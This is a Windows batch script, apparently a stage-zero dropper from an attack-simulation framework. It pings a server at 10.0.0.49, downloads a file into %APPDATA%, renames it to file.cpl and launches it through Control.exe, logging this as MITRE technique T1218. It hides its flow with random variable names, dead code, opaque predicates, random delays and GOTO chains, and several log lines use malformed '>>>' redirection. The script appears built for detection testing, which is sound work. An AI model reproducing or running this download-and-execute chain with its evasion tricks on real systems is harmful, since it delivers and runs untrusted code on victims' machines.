@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments - plain literals for backend replacement
SET yktnwwf=%APPDATA%\7854\15b54c8d
SET fpakbq=Macula-Stage0-7854
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7854-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=firelox.txt
SET fpldhe=7854

REM Runtime variables with random names
SET zxmqp=%repbmqg%
SET dkgbm=%yktnwwf%
SET mnvfp=%edjwtl%
SET tqjwm=%rdzgrnne%
SET wphdk=%omxgazu%
SET rtlxy=%yydue%
SET bkmfv=%fpldhe%

REM Log file variable
SET logvar=%APPDATA%\!rtlxy!\macula-simulations.log

REM Initial random delay before operations
SET /A xqkdg=%RANDOM% %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Initial delay start (random !xqkdg!s)>>> "!logvar!" 2>nul
timeout /t !xqkdg! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Initial delay complete>>> "!logvar!" 2>nul

REM State machine initialization
SET state=0
GOTO jxqmr

REM Dead code section 1 (never reached)
:kvbnm
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Dead code block 1>>> "!logvar!" 2>nul
SET fake1=data123
SET fake2=more_data
GOTO END

REM Real execution starts here
:jxqmr
IF !state!==0 GOTO state_qlprk
IF !state!==17 GOTO state_tywqc
IF !state!==42 GOTO state_vxmnb
IF !state!==63 GOTO state_zkwpd
IF !state!==84 GOTO state_qmjfv
IF !state!==99 GOTO END

REM Delay between states (method 2)
:pause_qwzn
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Delay start (ping)>>> "!logvar!" 2>nul
ping -n 4 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Delay complete>>> "!logvar!" 2>nul
GOTO lqmpv

REM State 0: Initial setup and directory check
:state_qlprk
echo [!DATE! !TIME!][DEBUG][!wphdk!]: State 0 - Setup>>> "!logvar!" 2>nul
IF NOT EXIST "!dkgbm!" (
    echo [!DATE! !TIME!][DEBUG][!wphdk!]: Creating output directory>>> "!logvar!" 2>nul
    mkdir "!dkgbm!" 2>nul
)
SET state=17
GOTO pause_qwzn

REM Dead code section 2
:fkwjn
REM This is never executed
SET junkvar=useless
IF 0==1 GOTO jxqmr
GOTO END

REM State 17: Heartbeat check to external server
:lqmpv
:state_tywqc
echo [!DATE! !TIME!][DEBUG][!wphdk!]: State 17 - Heartbeat start>>> "!logvar!" 2>nul
SET hb_result=0
SET hb_err=
curl -k -s -o nul "!tqjwm!"
IF !errorlevel!==0 (
    SET hb_result=1
) ELSE (
    SET hb_err=connection_failed
)
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Heartbeat result=!hb_result! err=!hb_err!>>> "!logvar!" 2>nul

REM TTP logging for heartbeat (not MITRE TTP, just debug)
REM State transition
SET state=42
GOTO jxqmr

REM Opaque predicate with dead branch
:fake_condition
IF 1==1 (
    GOTO real_branch
) ELSE (
    GOTO dead_branch
)

REM Real branch for state 42
:real_branch
REM State 42: Download DLL from external server
:state_vxmnb
echo [!DATE! !TIME!][DEBUG][!wphdk!]: State 42 - Download start>>> "!logvar!" 2>nul
SET down_result=0
SET down_err=

echo [!DATE! !TIME!][DEBUG][!wphdk!]: Downloading from !zxmqp! to !dkgbm!\!mnvfp!>>> "!logvar!" 2>nul
curl -k -s -o "!dkgbm!\!mnvfp!" "!zxmqp!"
IF !errorlevel!==0 (
    SET down_result=1
    echo [!DATE! !TIME!][DEBUG][!wphdk!]: Download complete>>> "!logvar!" 2>nul
) ELSE (
    SET down_err=download_failed
    echo [!DATE! !TIME!][DEBUG][!wphdk!]: Download failed>>> "!logvar!" 2>nul
)

REM Delay between operations (method 3)
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Delay start (choice)>>> "!logvar!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Delay complete>>> "!logvar!" 2>nul

REM State transition
SET state=63
GOTO jxqmr

REM Dead branch never reached
:dead_branch
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Dead branch executed>>> "!logvar!" 2>nul
GOTO END

REM Dead code section 3
:vnbmc
REM Unreachable cleanup code
del /f /q C:\Windows\Temp\*.tmp 2>nul
GOTO END

REM State 63: Rename downloaded file to .cpl extension
:state_zkwpd
echo [!DATE! !TIME!][DEBUG][!wphdk!]: State 63 - Rename start>>> "!logvar!" 2>nul
SET rename_result=0
SET rename_err=

IF EXIST "!dkgbm!\!mnvfp!" (
    echo [!DATE! !TIME!][DEBUG][!wphdk!]: Renaming !mnvfp! to file.cpl>>> "!logvar!" 2>nul
    ren "!dkgbm!\!mnvfp!" "file.cpl" 2>nul
    IF !errorlevel!==0 (
        SET rename_result=1
        echo [!DATE! !TIME!][DEBUG][!wphdk!]: Rename successful>>> "!logvar!" 2>nul
    ) ELSE (
        SET rename_err=rename_failed
        echo [!DATE! !TIME!][DEBUG][!wphdk!]: Rename failed>>> "!logvar!" 2>nul
    )
) ELSE (
    SET rename_err=file_not_found
    echo [!DATE! !TIME!][DEBUG][!wphdk!]: Source file not found>>> "!logvar!" 2>nul
)

REM Random delay
SET /A jhqwe=%RANDOM% %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Random delay !jhqwe!s start>>> "!logvar!" 2>nul
timeout /t !jhqwe! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Random delay complete>>> "!logvar!" 2>nul

SET state=84
GOTO jxqmr

REM Nested GOTO chain - dead end
:chain_a
GOTO chain_b
:chain_b
GOTO chain_c
:chain_c
REM Nothing here
GOTO END

REM State 84: Execute with Control.exe (T1218 MITRE Technique)
:state_qmjfv
echo [!DATE! !TIME!][DEBUG][!wphdk!]: State 84 - Execution start (T1218)>>> "!logvar!" 2>nul
SET exec_result=0
SET exec_err=

IF EXIST "!dkgbm!\file.cpl" (
    echo [!DATE! !TIME!][DEBUG][!wphdk!]: Executing Control.exe with file.cpl>>> "!logvar!" 2>nul
    start "" Control.exe "!dkgbm!\file.cpl"
    IF !errorlevel!==0 (
        SET exec_result=1
        echo [!DATE! !TIME!][DEBUG][!wphdk!]: Execution successful>>> "!logvar!" 2>nul
    ) ELSE (
        SET exec_err=execution_failed
        echo [!DATE! !TIME!][DEBUG][!wphdk!]: Execution failed>>> "!logvar!" 2>nul
    )
    
    REM MITRE T1218 logging
    SET ttp_result=!exec_result!
    SET ttp_err=!exec_err!
    SET ttp_time=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME:~0,8!.000
    echo [!ttp_time!][!wphdk!]: !rtlxy!-!bkmfv!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_err!>> "!logvar!" 2>nul || echo [!DATE! !TIME!][DEBUG][!wphdk!]: Log write suppressed>>> "!logvar!" 2>nul
) ELSE (
    SET exec_err=cpl_not_found
    SET ttp_result=0
    SET ttp_err=cpl_not_found
    SET ttp_time=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME:~0,8!.000
    echo [!ttp_time!][!wphdk!]: !rtlxy!-!bkmfv!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_err!>> "!logvar!" 2>nul || echo [!DATE! !TIME!][DEBUG][!wphdk!]: Log write suppressed>>> "!logvar!" 2>nul
    echo [!DATE! !TIME!][DEBUG][!wphdk!]: CPL file not found>>> "!logvar!" 2>nul
)

REM Final state transition
SET state=99
GOTO jxqmr

REM Final cleanup (simulated)
:END
echo [!DATE! !TIME!][DEBUG][!wphdk!]: Script execution complete>>> "!logvar!" 2>nul
EXIT